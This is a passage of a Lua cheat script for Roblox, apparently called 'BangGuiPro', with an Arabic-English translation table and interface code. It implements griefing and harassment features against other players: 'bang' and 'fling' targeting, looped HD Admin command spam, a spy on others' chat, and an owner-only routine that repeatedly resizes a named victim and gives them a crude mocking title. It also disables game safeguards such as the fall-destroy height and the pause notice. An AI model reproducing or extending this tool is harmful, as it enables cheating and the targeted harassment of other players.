    ["ما في لاعب مستهدف"] = "No target player selected.",
    ["ما قدرت احصل على محور اللاعب"] = "Couldn't get the player's pivot.",
    ["تم نسخ المحور: "] = "Copied the pivot: ",
    ["اوامر HD ما تمر عبر الشات"] = "HD commands don't go through chat.",
    ["اكتب الامر هنا"] = "Enter the command here.",
    [" كلبشة مكتشفة! ريسيت تلقائي..."] = " Cuff detected! Resetting automatically...",
    [" رجعت لنفس المكان!"] = " Returned you to the same spot!",
    [" [Fallback] تجميد مكتشف: "] = " [Fallback] Freeze detected: ",
    [" [Fallback] رجعت للموقع الآمن!"] = " [Fallback] Returned to the safe spot!",
    [" حماية كلبشه2 مفعلة"] = " Cuff Protect 2 is on.",
    ["ايقاف كلبشه2"] = "Stop Cuff Protect 2",
    ["تم ايقاف حماية كلبشه2"] = " Cuff Protect 2 stopped.",
    ["مضاد NV مفعل — جميع الاوامر محمية"] = " Anti-NV is on—all commands are protected.",
    ["تم ايقاف مضاد NV"] = " Anti-NV stopped.",
    ["FPS: %d -> %d | حذفت %d قطعة"] = "FPS: %d -> %d | Removed %d objects",
    ["رجوين"] = "Rejoin",
    ["تغيير السيرفر"] = "Change Server",
    ["كتم الصوت"] = "Mute Audio",
    ["تفعيل الصوت"] = "Unmute Audio",
    ["فول برايت"] = "Full Bright",
    ["ايقاف برايت"] = "Turn Off Full Bright",
    ["ازالة الضباب"] = "Remove Fog",
    ["تفعيل الضباب"] = "Enable Fog",
    ["تجميد الكاميرا"] = "Lock Camera",
    ["الغاء التجميد"] = "Unlock Camera",
    ["وضع الليل"] = "Night Mode",
    ["الغاء الليل"] = "Turn Off Night Mode",
    ["قريباً"] = "Coming soon",
    ["الادمن"] = "Admin",
    ["مضاد ايقاف نسخ"] = "Anti-Copy Stop",
    ["سباي الشات"] = "Chat Spy",
    ["سجل الاشعارات"] = "Notification Log",
    ["لا توجد اشعارات بعد"] = "No notifications yet.",
    ["مسح الكل"] = "Clear all",
    ["الكل"] = "All",
    ["نجاح"] = "Success",
    ["تنبيه"] = "Warning",
    ["خطأ"] = "Error",
    ["معلومة"] = "Info",
    ["متأكد؟"] = "Sure?",
    ["تحكم الطيران"] = "Flight Controls",
    [" اللون"] = " Color",
    [" تثبيت الدوائر"] = " Lock Floating Buttons",
    [" تثبيت دائرة السكربت"] = " Lock Script Button",
    [" تثبيت دائرة الشات"] = " Lock Chat Button",
    [" دائرة السكربت مثبّتة — لا يمكن تحريكها"] = " Script button locked—you can't move it.",
    [" دائرة السكربت حرة"] = " Script button unlocked.",
    [" دائرة الشات مثبّتة — لا يمكن تحريكها"] = " Chat button locked—you can't move it.",
    [" دائرة الشات حرة"] = " Chat button unlocked.",
    [" HD Admin ما اتحمل بعد"] = " HD Admin hasn't loaded yet.",
    ["سبام أوامر HD"] = "HD Command Spam",
    ["سبام اوامر, امانه قيمو ههههه"] = "Command spam—please rate it, hahaha.",
    ["تفعيل سبام"] = "Start Spam",
    ["رجوع"] = "Back",
    ["متوقف — فعله يسطيف سبام ممتاز"] = "Stopped—turn it on, bro; the spam is great.",
    ["بانتظار انتهاء الطلب السابق قبل إعادة التشغيل"] = "Waiting for the previous request to finish before restarting.",
    ["اكتب الأمر أولاً"] = "Enter the command first.",
    ["حدد مدة صحيحة بين 1 و3600 ثانية"] = "Enter a valid interval from 1 to 3600 seconds.",
    ["HD Admin غير جاهز — لم يبدأ التكرار"] = "HD Admin isn't ready—spam hasn't started.",
    ["إيقاف سبام"] = "Stop Spam",
    ["مفعّل — كل "] = "Active—every ",
    [" ثانية | إرسالات: "] = " seconds | Sent: ",
    ["اكتب الحجم من 0 إلى 3"] = "Enter a size from 0 to 3.",
    ["تفعيل سبام تكبير حجم"] = "Start Size Spam",
    ["إغلاق"] = "Close",
    ["متوقف"] = "Stopped",
    ["حط رقم من 0 الى 3، مثل 2 او 1.5"] = "Enter a number from 0 to 3, like 2 or 1.5.",
    ["HD Admin غير جاهز — لم يبدا التكرار"] = "HD Admin isn't ready—spam hasn't started.",
    ["إيقاف سبام تكبير حجم"] = "Stop Size Spam",
    ["مفعّل — "] = "Active—",
    [" ما لقيت واجهة HD Admin في PlayerGui"] = " Couldn't find the HD Admin interface in PlayerGui.",
    ["DefaultChat غير موجود في هذه اللعبة"] = "DefaultChat isn't available in this game.",
    ["سباي الشات شغّال"] = "Chat Spy is running.",
    ["ذا "] = "That ",
    [" نسخ عليك"] = " copied you.",
    [" HD Admin Signals مو موجودة"] = " HD Admin Signals weren't found.",
    [" رصد عكس — اعادة النسخ فوراً"] = " Reversal detected—copying again right away.",
    [" رصد ايقاف — اعادة النسخ"] = " Stop detected—copying again.",
    ["مضاد ايقاف النسخ شغّال"] = "Anti-Copy Stop is running.",
    ["تم ايقاف المضاد"] = "Protection stopped.",
    ["اكتب يوزر الهدف في خانة الكتابة"] = "Enter the target's username in the text box.",
    [" نسخ محور فعّال على: "] = " Pivot copying enabled for: ",
    [" تم ايقاف نسخ محور"] = " Pivot copying stopped.",
    ["تم ايقاف مضاد الفويد"] = "Anti-Void stopped.",
    ["تم تفعيل مضاد الفويد واخفاء تعليق النت"] = "Anti-Void enabled and the connection pause overlay hidden.",
    ["سبام"] = "Spam",
    ["سبام سكنات"] = "Skin Spam",
    ["سبام تكبير حجم"] = "Size Spam",
    [" مسح"] = " Clear",
    [" اونر"] = " Owner",
    [" للمشتركين"] = " Subscribers",
    [" اللغة"] = " Language",
    ["  اللغة  "] = "  Language  ",
    ["  اللون  "] = "  Color  ",
    [" اللون"] = " Color",
    [" الحجم"] = " Size",
    ["  الحجم  "] = "  Size  ",
    ["تاريخ التسجيل: "] = "Account created: ",
    ["صانعه: "] = "By: ",
    ["آخر تحديث: "] = "Last updated: ",
    ["عام"] = "Public",
    ["خاص VIP"] = "Private VIP",
    ["محجوز"] = "Reserved",
    ["جاري..."] = "Joining...",
    [" ثانية"] = " seconds",
    [" اللاعب بعيد جداً، حاول تقرب منه"] = " The player is too far away—try getting closer.",
    [" ايقاف سبام سكنات"] = " Stop Skin Spam",
    [" تعذّر تحميل شخصية اللاعب"] = " Couldn't load the player's character.",
    [" تم ايقاف سبام سكنات"] = " Skin Spam stopped.",
    [" جاري تحميل اللاعب..."] = " Loading player...",
    [" سبام سكنات مفعّل"] = " Skin Spam is on.",
    [" مضاد بانق2 ايقاف"] = " Anti-Bang 2 stopped.",
    [" مضاد بانق2 مفعّل"] = " Anti-Bang 2 is on.",
    [" مضاد فويد ايقاف"] = " Anti-Void stopped.",
    [" مضاد فويد مفعّل"] = " Anti-Void is on.",
    ["اخفاء علامة Pause"] = "Hide the Pause overlay",
    ["اغلاق الادمن"] = "Close Admin",
    ["اكتب الامر اولاً"] = "Enter the command first.",
    ["المستهدف راح للفويد، رجعتك للريسبون"] = "The target went into the void; returning you to spawn.",
    ["المستهدف طلع من السيرفر"] = "The target left the server.",
    ["ايقاف اخفاء Pause"] = "Stop Hiding Pause",
    ["ايقاف السباي"] = "Stop Spy",
    ["ايقاف المضاد"] = "Stop Protection",
    ["ايقاف فري كام"] = "Stop Freecam",
    ["ايقاف مضاد بانق2"] = "Stop Anti-Bang 2",
    ["ايقاف مضاد فويد"] = "Stop Anti-Void",
    ["ايقا�� هيدلس"] = "Stop Headless",
    ["تجميد جديد"] = "New Freeze",
    ["تم اجبارك على الجلوس"] = "You were forced to sit.",
    ["تم احضارك بواسطة الاونر"] = "The owner brought you here.",
    ["تم ارسال الامر"] = "Command sent.",
    ["تم عكس ازرار التحكم"] = "Your controls were inverted.",
    ["تم قفل كاميرتك"] = "Your camera was locked.",
    ["تمت محاولة الكلبشة"] = "Cuff attempt completed.",
    ["جاري التجميد..."] = "Freezing...",
    ["جاري الكلبشة..."] = "Cuffing...",
    ["رجع المستهدف، تم التفعيل عليه تلقائي"] = "The target returned, so protection was enabled on them automatically.",
    ["سيتم الاستهداف: "] = "Targeting: ",
    ["فري كام"] = "Freecam",
    ["كلبش جديد"] = "New Cuff",
    ["لم يتم العثور على لاعب"] = "Player not found.",
    ["ما لقيت الكلبشة الجديدة، اكتب اسمها بالخانة"] = "Couldn't find the new cuff; enter its name in the box.",
    ["تعليق جديد"] = "New Hang",
    ["تم ايقاف الفري كام"] = "Freecam stopped.",
    ["تم تشغيل الفري كام"] = "Freecam started.",
    ["تعذّر تشغيل الفري كام"] = "Couldn't start Freecam.",
    ["  ايقاف نسخ محور"] = "  Stop Pivot Copy",
    [" | حذفت "] = " | Removed ",
    [" قطعة"] = " objects",
}
for _t18k, _t18v in pairs(_T18ExtraTR) do
    _T18TR[_t18k] = _t18v
end

_T18Rev = {}
;(function()
    for _t18k, _t18v in pairs(_T18TR) do
        local existing = _T18Rev[_t18v]
        if existing == nil or #_t18k < #existing or (#_t18k == #existing and _t18k < existing) then
            _T18Rev[_t18v] = _t18k
        end
    end
end)()

local _T18LangKeys = { en = {}, ar = {} }
for _t18k in pairs(_T18TR) do
    if _t18k:match("%s") then table.insert(_T18LangKeys.en, _t18k) end
end
for _t18k in pairs(_T18Rev) do
    if _t18k:match("%s") then table.insert(_T18LangKeys.ar, _t18k) end
end
local function _T18SortLangKeys(keys)
    table.sort(keys, function(a, b)
        if #a == #b then return a < b end
        return #a > #b
    end)
end
_T18SortLangKeys(_T18LangKeys.en)
_T18SortLangKeys(_T18LangKeys.ar)

function T18TranslateText(value, lang)
    local source = tostring(value or "")
    local map = (lang == "en") and _T18TR or _T18Rev
    local exact = map[source]
    if exact ~= nil then return exact end

    local keys = (lang == "en") and _T18LangKeys.en or _T18LangKeys.ar
    local output = {}
    local index = 1
    while index <= #source do
        local matchedKey, matchedValue
        for _, key in ipairs(keys) do
            if string.sub(source, index, index + #key - 1) == key then
                matchedKey = key
                matchedValue = map[key]
                break
            end
        end
        if matchedKey then
            table.insert(output, matchedValue)
            index = index + #matchedKey
        else
            table.insert(output, string.sub(source, index, index))
            index = index + 1
        end
    end
    return table.concat(output)
end

function T18T(s)
    return T18TranslateText(s, _T18Lang)
end

local _T18BoundTextObjects = setmetatable({}, { __mode = "k" })
local _T18BoundScreenGuis = setmetatable({}, { __mode = "k" })
local _T18BoundContainers = setmetatable({}, { __mode = "k" })
local _T18OriginalTextAlignment = setmetatable({}, { __mode = "k" })
local _T18TextWriteGuard = setmetatable({}, { __mode = "k" })

local function _T18IsScriptScreenGui(gui)
    if not gui or not gui:IsA("ScreenGui") then return false end
    return gui.Name == "BangGuiPro" or gui.Name == "R7LBigWarn" or gui.Name:match("^T18") ~= nil
end

local function _T18FindScriptScreenGui(instance)
    local current = instance
    while current do
        if current:IsA("ScreenGui") then
            return _T18IsScriptScreenGui(current) and current or nil
        end
        current = current.Parent
    end
    return nil
end

local function _T18IsUserContent(instance, propertyName)
    if propertyName == "Text" and instance:IsA("TextBox") then return true end
    if propertyName == "Text" and (instance.Name == "MessageText" or instance.Name == "BubbleText") then return true end
    if instance == _T18MainTextLabel or instance == _T18ImportantTextLabel then return true end
    local parent = instance.Parent
    while parent do
        if parent.Name == "ChatList" or parent.Name == "ChatSpyMessageRow" then return true end
        parent = parent.Parent
    end
    return false
end

local function _T18SetTextDirection(instance, lang)
    if not (instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox")) then return end
    if not instance:IsA("TextBox") and _T18IsUserContent(instance, "Text") then return end
    if _T18OriginalTextAlignment[instance] == nil then
        _T18OriginalTextAlignment[instance] = instance.TextXAlignment
    end
    local original = _T18OriginalTextAlignment[instance]
    if lang == "en" and original == Enum.TextXAlignment.Right then
        instance.TextXAlignment = Enum.TextXAlignment.Left
    else
        instance.TextXAlignment = original
    end
end

local function _T18TranslateProperty(instance, propertyName)
    if not instance or not instance.Parent or _T18TextWriteGuard[instance] then return end
    if _T18IsUserContent(instance, propertyName) then return end
    local ok, current = pcall(function() return instance[propertyName] end)
    if not ok or type(current) ~= "string" or current == "" then return end
    local translated = T18TranslateText(current, _T18Lang)
    if translated ~= current then
        _T18TextWriteGuard[instance] = true
        pcall(function() instance[propertyName] = translated end)
        _T18TextWriteGuard[instance] = nil
    end
end

local function _T18BindTextObject(instance)
    if _T18BoundTextObjects[instance] then return end
    local isLabel = instance:IsA("TextLabel")
    local isButton = instance:IsA("TextButton")
    local isBox = instance:IsA("TextBox")
    if not (isLabel or isButton or isBox) then return end
    _T18BoundTextObjects[instance] = true
    _T18SetTextDirection(instance, _T18Lang)

    if isBox then
        instance:GetPropertyChangedSignal("PlaceholderText"):Connect(function()
            _T18TranslateProperty(instance, "PlaceholderText")
        end)
        _T18TranslateProperty(instance, "PlaceholderText")
    else
        instance:GetPropertyChangedSignal("Text"):Connect(function()
            _T18TranslateProperty(instance, "Text")
        end)
        _T18TranslateProperty(instance, "Text")
    end
end

local function _T18WatchScriptScreenGui(gui)
    if _T18BoundScreenGuis[gui] or not _T18IsScriptScreenGui(gui) then return end
    _T18BoundScreenGuis[gui] = true
    for _, descendant in ipairs(gui:GetDescendants()) do
        _T18BindTextObject(descendant)
    end
    gui.DescendantAdded:Connect(function(descendant)
        task.defer(function()
            if descendant.Parent and _T18FindScriptScreenGui(descendant) then
                _T18BindTextObject(descendant)
            end
        end)
    end)
end

local function _T18WatchGuiContainer(container)
    if not container or _T18BoundContainers[container] then return end
    _T18BoundContainers[container] = true
    for _, descendant in ipairs(container:GetDescendants()) do
        if descendant:IsA("ScreenGui") and _T18IsScriptScreenGui(descendant) then
            _T18WatchScriptScreenGui(descendant)
        end
    end
    container.DescendantAdded:Connect(function(descendant)
        task.defer(function()
            if not descendant.Parent then return end
            if descendant:IsA("ScreenGui") and _T18IsScriptScreenGui(descendant) then
                _T18WatchScriptScreenGui(descendant)
            else
                local root = _T18FindScriptScreenGui(descendant)
                if root then
                    _T18WatchScriptScreenGui(root)
                    _T18BindTextObject(descendant)
                end
            end
        end)
    end)
end

local function _T18ApplyLanguageToContainer(container)
    if not container then return end
    for _, gui in ipairs(container:GetDescendants()) do
        if gui:IsA("ScreenGui") and _T18IsScriptScreenGui(gui) then
            _T18WatchScriptScreenGui(gui)
            for _, descendant in ipairs(gui:GetDescendants()) do
                _T18BindTextObject(descendant)
                _T18SetTextDirection(descendant, _T18Lang)
                if descendant:IsA("TextBox") then
                    _T18TranslateProperty(descendant, "PlaceholderText")
                else
                    _T18TranslateProperty(descendant, "Text")
                end
            end
        end
    end
end

function T18ApplyLang(toLang)
    _T18Lang = (toLang == "en") and "en" or "ar"
    local coreGui
    local playerGui
    pcall(function() coreGui = game:GetService("CoreGui") end)
    pcall(function() playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:FindFirstChild("PlayerGui") end)
    if coreGui then pcall(function() _T18WatchGuiContainer(coreGui) end) end
    if playerGui then pcall(function() _T18WatchGuiContainer(playerGui) end) end
    if coreGui then pcall(function() _T18ApplyLanguageToContainer(coreGui) end) end
    if playerGui then pcall(function() _T18ApplyLanguageToContainer(playerGui) end) end

    _T18SG = nil
    if coreGui then pcall(function() _T18SG = coreGui:FindFirstChild("BangGuiPro") end) end
    if not _T18SG and playerGui then pcall(function() _T18SG = playerGui:FindFirstChild("BangGuiPro") end) end

    if _T18MainTextLabel then
        pcall(function()
            _T18MainTextLabel.Text = (_T18Lang == "en") and _T18MainTextEn or _T18MainTextAr
            _T18MainTextLabel.TextXAlignment = (_T18Lang == "en") and Enum.TextXAlignment.Left or Enum.TextXAlignment.Right
        end)
    end
    if _T18ImportantTextLabel then
        pcall(function()
            _T18ImportantTextLabel.Text = (_T18Lang == "en") and _T18ImportantTextEn or _T18ImportantTextAr
            _T18ImportantTextLabel.TextXAlignment = (_T18Lang == "en") and Enum.TextXAlignment.Left or Enum.TextXAlignment.Right
        end)
    end
    if T18RefreshNewsLayout then
        pcall(function() T18RefreshNewsLayout(_T18Lang) end)
    end
end

end)()
  if _T18ArBtn and _T18EnBtn then
      function T18MarkActive(lang)
          local _arActive = (lang == "ar")

          _T18ArBtn.BackgroundColor3 = _arActive and Color3.fromRGB(220, 220, 220) or Color3.fromRGB(28, 28, 28)
          _T18ArBtn.TextColor3       = _arActive and Color3.fromRGB(20, 20, 20)    or Color3.fromRGB(160, 160, 160)
          _T18ArBtn.Text             = (_arActive and "  " or "     ") .. "  العربية"

          _T18EnBtn.BackgroundColor3 = (not _arActive) and Color3.fromRGB(220, 220, 220) or Color3.fromRGB(28, 28, 28)
          _T18EnBtn.TextColor3       = (not _arActive) and Color3.fromRGB(20, 20, 20)    or Color3.fromRGB(160, 160, 160)
          _T18EnBtn.Text             = ((not _arActive) and "  " or "     ") .. "  English"

          if _T18LangSelectorBtn then
              _T18LangSelectorBtn.Text = _arActive and "  اللغة  " or "  Language  "
          end

          if _T18ColorBtn then
              _T18ColorBtn.Text = _arActive and "  اللون  " or "  Color  "
          end
      end

      _T18ArBtn.MouseButton1Click:Connect(function()
          if _T18Lang == "ar" then
              pcall(function() _T18ArBtn.Parent.Visible = false end)
              if _T18ColorBtn then
                  TweenService:Create(_T18ColorBtn,
                      TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
                      { Position = UDim2.new(0, 12, 0, 158) }):Play()
              end
              return
          end
          T18ApplyLang("ar")
          T18MarkActive("ar")
          pcall(function() _T18ArBtn.Parent.Visible = false end)
          if _T18ColorBtn then
              TweenService:Create(_T18ColorBtn,
                  TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
                  { Position = UDim2.new(0, 12, 0, 158) }):Play()
          end
      end)

      _T18EnBtn.MouseButton1Click:Connect(function()
          if _T18Lang == "en" then
              pcall(function() _T18EnBtn.Parent.Visible = false end)
              if _T18ColorBtn then
                  TweenService:Create(_T18ColorBtn,
                      TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
                      { Position = UDim2.new(0, 12, 0, 158) }):Play()
              end
              return
          end
          T18ApplyLang("en")
          T18MarkActive("en")
          pcall(function() _T18EnBtn.Parent.Visible = false end)
          if _T18ColorBtn then
              TweenService:Create(_T18ColorBtn,
                  TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
                  { Position = UDim2.new(0, 12, 0, 158) }):Play()
          end
      end)

      T18MarkActive("ar")
  end
  

;(function()

    if LocalPlayer.UserId ~= 295155587 then return end

    local MihwarCopyBtn = makeButton(
        "MihwarCopyBtn",
        "نسخ محور",
        UDim2.new(1, -20, 0, 38),
        UDim2.new(0, 10, 0, 414),
        Theme.ButtonGreen,
        Theme.ButtonGreenAlt
    )
    MihwarCopyBtn.Parent         = TargetScrollFrame
    TargetScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 464)

    local _active = false

    MihwarCopyBtn.MouseButton1Click:Connect(function()

        if not _active then

            local tg = (Input and Input.Text or ""):match("^%s*(.-)%s*$")
            if tg == "" then
                showNotification("اكتب يوزر الهدف في خانة الكتابة")
                return
            end

            local cmds = {
                "!size "    .. tg .. " 3",
                "!height "  .. tg .. " 0",
                "!neon "    .. tg,
                "!color "  .. tg .. " pink",
                "!titlepk " .. tg .. " اهه فحلءي محورر",
            }

            _active = true
            setButtonState(MihwarCopyBtn, true,
                "  ايقاف نسخ محور", "نسخ محور",
                Theme.Active, Theme.ButtonGreen)
            showNotification(" نسخ محور فعّال على: " .. tg)

            task.spawn(function()
                while _active do
                    for _, c in ipairs(cmds) do
                        if not _active then break end
                        hdRunCommand(c)
                        task.wait(0.15)
                    end
                    task.wait(5) 
                end
            end)

        else
            _active = false
            setButtonState(MihwarCopyBtn, false,
                "  ايقاف نسخ محور", "نسخ محور",
                Theme.Active, Theme.ButtonGreen)
            showNotification(" تم ايقاف نسخ محور")
        end

    end)

end)()

local _AntiVoid = {
    enabled = false,
    heartbeatConn = nil,
    steppedConn = nil,
    pausedConn = nil,
    charAddedConn = nil,
    lastSafeCFrame = nil,
    spawnCFrame = nil,
    isRecovering = false,
    lastRescueTick = 0,
    maxDistance = 2800,
    maxAltitude = 2200,
    heightLimit = 437.93,
    maxVelocity = 450,
}

local function _getInitialSpawnCFrame()
    local spawnLoc
    pcall(function()
        local respawnLoc = LocalPlayer.RespawnLocation
        if respawnLoc and respawnLoc:IsA("BasePart") then
            spawnLoc = respawnLoc
        end
    end)
    spawnLoc = spawnLoc or workspace:FindFirstChildOfClass("SpawnLocation", true)
    if spawnLoc and spawnLoc:IsA("BasePart") then
        return spawnLoc.CFrame * CFrame.new(0, 5, 0)
    end
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root and root.Position.Magnitude < 1500 and math.abs(root.Position.Y) < 800 then
        return root.CFrame
    end
    return CFrame.new(0, 35, 0)
end

local function _suppressGameplayPausedUI()

    pcall(function()
        GuiService:SetGameplayPausedNotificationEnabled(false)
    end)

    pcall(function()
        local coreGui = game:GetService("CoreGui")
        local robloxGui = coreGui:FindFirstChild("RobloxGui")
        if robloxGui then
            for _, desc in ipairs(robloxGui:GetDescendants()) do
                local lowerName = desc.Name:lower()
                if lowerName:find("gameplaypaused", 1, true)
                    or lowerName:find("pausenotification", 1, true) then
                    pcall(function()
                        if desc:IsA("GuiObject") then
                            desc.Visible = false
                        elseif desc:IsA("ScreenGui") then
                            desc.Enabled = false
                        end
                    end)
                end
            end
        end
    end)
end

local function _rescueFromVoid(reason)
    if _AntiVoid.isRecovering then return end
    if tick() - _AntiVoid.lastRescueTick < 0.35 then return end
    _AntiVoid.isRecovering = true
    _AntiVoid.lastRescueTick = tick()

    _suppressGameplayPausedUI()

    task.spawn(function()
        pcall(function()
            local char = LocalPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            local hum  = char and char:FindFirstChildOfClass("Humanoid")
            if not root then return end

            local targetCF
            if reason == "HeightLimit" then
                targetCF = _AntiVoid.spawnCFrame or _getInitialSpawnCFrame()
            else
                targetCF = _AntiVoid.spawnCFrame or _AntiVoid.lastSafeCFrame or _getInitialSpawnCFrame()
                if _AntiVoid.lastSafeCFrame and _AntiVoid.lastSafeCFrame.Position.Magnitude < 1800 then
                    targetCF = _AntiVoid.lastSafeCFrame
                end
            end

            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.AssemblyLinearVelocity  = Vector3.zero
                    part.AssemblyAngularVelocity = Vector3.zero
                    part.Velocity                = Vector3.zero
                    part.RotVelocity             = Vector3.zero
                end
            end

            root.Anchored = true
            root.CFrame   = targetCF

            pcall(function()
                LocalPlayer:RequestStreamAroundAsync(targetCF.Position, 2)
            end)

            if hum then
                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                hum.PlatformStand = false
                hum.Sit = false
            end

            task.wait(0.08)
            if root and root.Parent then
                root.AssemblyLinearVelocity  = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
                root.CFrame                  = targetCF
                root.Anchored                = false
            end
        end)
        _AntiVoid.isRecovering = false
    end)
end

local function _setAntiVoidEnabled(state)
    _AntiVoid.enabled = state
    _PauseNotificationControl.antiVoid = state
    _applyPauseNotificationSetting()

    if _AntiVoid.heartbeatConn then
        _AntiVoid.heartbeatConn:Disconnect()
        _AntiVoid.heartbeatConn = nil
    end
    if _AntiVoid.steppedConn then
        _AntiVoid.steppedConn:Disconnect()
        _AntiVoid.steppedConn = nil
    end
    if _AntiVoid.pausedConn then
        _AntiVoid.pausedConn:Disconnect()
        _AntiVoid.pausedConn = nil
    end

    if not state then
        _applyPauseNotificationSetting()
        return
    end

    -- نحفظ السبون أولاً قبل أي فحص عشان ما يحفظ موقع مرتفع على أنه سبون
    _AntiVoid.spawnCFrame = _getInitialSpawnCFrame()
    _AntiVoid.lastSafeCFrame = _AntiVoid.spawnCFrame

    -- لو كان اللاعب فوق الحد عند التفعيل، ننقله للسبون مباشرة
    local currentChar = LocalPlayer.Character
    local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
    if currentRoot and currentRoot.Position.Y >= (_AntiVoid.heightLimit - 0.20) then
        _rescueFromVoid("HeightLimit")
    end

    _suppressGameplayPausedUI()

    pcall(function()
        workspace.FallenPartsDestroyHeight = 0/0
    end)

    _AntiVoid.pausedConn = LocalPlayer:GetPropertyChangedSignal("GameplayPaused"):Connect(function()
        if not _AntiVoid.enabled then return end
        if LocalPlayer.GameplayPaused then
            _suppressGameplayPausedUI()
            _rescueFromVoid("GameplayPaused")
        end
    end)

    _AntiVoid.steppedConn = RunService.Stepped:Connect(function(_, deltaTime)
        if not _AntiVoid.enabled then return end

        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then return end

        local pos = root.Position
        local velocity = root.AssemblyLinearVelocity
        local guardY = _AntiVoid.heightLimit - 0.20
        local predictedY = pos.Y + math.max(velocity.Y, 0) * (deltaTime or 0)

        if pos.Y >= guardY or predictedY >= guardY then
            _rescueFromVoid("HeightLimit")
            return
        end
    end)

    _AntiVoid.heartbeatConn = RunService.Heartbeat:Connect(function()
        if not _AntiVoid.enabled then return end

        if LocalPlayer.GameplayPaused then
            _suppressGameplayPausedUI()
            _rescueFromVoid("PausedLoop")
            return
        end

        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        if not root or not hum or hum.Health <= 0 then return end

        local pos = root.Position
        local vel = root.AssemblyLinearVelocity

        local isNaN     = (pos.X ~= pos.X) or (pos.Y ~= pos.Y) or (pos.Z ~= pos.Z)
        local voidLimit = -120
        pcall(function()
            if workspace.FallenPartsDestroyHeight == workspace.FallenPartsDestroyHeight then
                voidLimit = math.max(workspace.FallenPartsDestroyHeight + 35, -250)
            end
        end)

        if not isNaN and pos.Y >= _AntiVoid.heightLimit then
            _rescueFromVoid("HeightLimit")
            return
        end

        local isTooLow  = pos.Y < voidLimit
        local isTooHigh = pos.Y > _AntiVoid.maxAltitude
        local isTooFar  = pos.Magnitude > _AntiVoid.maxDistance
        local isFlung   = vel.Magnitude > _AntiVoid.maxVelocity and not flyActive

        if isNaN or isTooLow or isTooHigh or isTooFar or isFlung then
            _rescueFromVoid("OutBounds")
            return
        end

        if hum.FloorMaterial ~= Enum.Material.Air
            and vel.Magnitude < 45
            and pos.Magnitude < 1500
            and math.abs(pos.Y) < 500 then
            _AntiVoid.lastSafeCFrame = root.CFrame * CFrame.new(0, 2, 0)
        end
    end)
end


AntiVoidBtn.MouseButton1Click:Connect(function()
    local nextState = not _AntiVoid.enabled
    _setAntiVoidEnabled(nextState)
    if nextState then
        setButtonState(AntiVoidBtn, true, T18T("ايقاف مضاد فويد"), T18T("مضاد فويد"), Theme.Active, Theme.ButtonBlue)
        showNotification(T18T("تم تفعيل مضاد فويد"))
    else
        setButtonState(AntiVoidBtn, false, T18T("ايقاف مضاد فويد"), T18T("مضاد فويد"), Theme.Active, Theme.ButtonBlue)
        showNotification(T18T("تم ايقاف مضاد فويد"))
    end
end)

-- ════════════════════════════════════════════════════════════════
-- مضاد فويد مطور: لو المستهدف راح للفويد (تحت) أو فوق، وانت مفعل عليه
-- بانق / هيد بانق / فلنق: يوقفه ويرجعك لمنطقة الريسبون، ولما يرجع
-- المستهدف يفعل نفس الميزة عليه تلقائي. يشتغل بس وزر مضاد فويد مفعّل.
-- ════════════════════════════════════════════════════════════════
;(function()
    _T18BV = { mode = nil, target = nil, state = "idle", backSince = nil }
    local _auto = false

    local function track(key, target)
        _T18BV.mode = key
        _T18BV.target = target
        _T18BV.state = "idle"
        _T18BV.backSince = nil
    end
    local function untrack(key)
        if _auto then return end
        if _T18BV.mode == key then
            _T18BV.mode = nil
            _T18BV.target = nil
            _T18BV.state = "idle"
            _T18BV.backSince = nil
        end
    end

    -- نلف دوال البدء والايقاف عشان نعرف المستهدف ونفرق بين الايقاف اليدوي والتلقائي
    local _oStartBang, _oStopBang = startBang, stopBang
    startBang = function(t, ...) track("bang", t) return _oStartBang(t, ...) end
    stopBang  = function(...) untrack("bang") return _oStopBang(...) end

    local _oStartHB, _oStopHB = startHeadBang, stopHeadBang
    startHeadBang = function(t, ...) track("headbang", t) return _oStartHB(t, ...) end
    stopHeadBang  = function(...) untrack("headbang") return _oStopHB(...) end

    local _oStartTF, _oStopTF = startTargetFling, stopTargetFling
    startTargetFling = function(t, ...) track("fling", t) return _oStartTF(t, ...) end
    stopTargetFling  = function(...) untrack("fling") return _oStopTF(...) end

    local MODES = {
        bang = {
            on    = function() return isActive end,
            set   = function(v) isActive = v end,
            stop  = function() stopBang() end,
            start = function(t) startBang(t) end,
            paint = function(on)
                setButtonState(BangBtn, on, T18T("ايقاف"), T18T("بانق"),
                    Theme.Active, Theme.PanelSoft)
            end,
        },
        headbang = {
            on    = function() return _HeadBang.active end,
            set   = function(v) _HeadBang.active = v end,
            stop  = function() stopHeadBang() end,
            start = function(t) startHeadBang(t) end,
            paint = function(on)
                setButtonState(HeadBangBtn, on, T18T("ايقاف"), T18T("هيد بانق"),
                    Theme.Active, Theme.PanelSoft)
            end,
        },
        fling = {
            on    = function() return targetFlingActive end,
            set   = function(v) targetFlingActive = v end,
            stop  = function() stopTargetFling(false) end,
            start = function(t) startTargetFling(t) end,
            paint = function(on)
                setButtonState(TargetFlingBtn, on, T18T("ايقاف الفلنق"), T18T("فلنق"),
                    Theme.Active, Theme.PanelSoft)
            end,
        },
    }

    local cachedSpawn = nil
    local spawnScanned = false

    local function respawnCF()
        local ok, rl = pcall(function() return LocalPlayer.RespawnLocation end)
        if ok and rl and rl:IsA("BasePart") and rl.Parent then
            return rl.CFrame * CFrame.new(0, 5, 0)
        end
        if not spawnScanned or (cachedSpawn and not cachedSpawn.Parent) then
            spawnScanned = true
            cachedSpawn = nil
            for _, d in ipairs(workspace:GetDescendants()) do
                if d:IsA("SpawnLocation") then
                    cachedSpawn = d
                    break
                end
            end
        end
